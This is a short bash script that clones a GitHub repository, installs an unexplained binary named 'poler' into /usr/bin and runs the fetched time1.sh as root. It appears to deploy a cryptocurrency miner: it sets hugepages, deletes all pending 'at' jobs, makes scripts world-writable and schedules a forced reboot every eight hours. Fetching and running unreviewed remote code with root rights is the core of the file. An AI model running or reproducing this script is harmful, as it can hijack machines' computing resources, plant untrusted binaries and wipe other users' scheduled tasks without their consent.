#!/bin/bash

rm -rf /tmp/my5/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir my5
git clone https://github.com/not100today/my5.git /tmp/my5
cd /tmp/my5
chmod +x /tmp/my5/poler
chmod 777 ./*.sh
cp /tmp/my5/poler /usr/bin/

sudo apt-get install dos2unix
sudo dos2unix time1.sh
sudo dos2unix 75.sh


touch /tmp/at.txt
chmod +x /tmp/at.txt
echo 'sudo systemctl reboot -f' >> /tmp/at.txt
sudo at now + 8 hours < /tmp/at.txt

sudo ./time1.sh
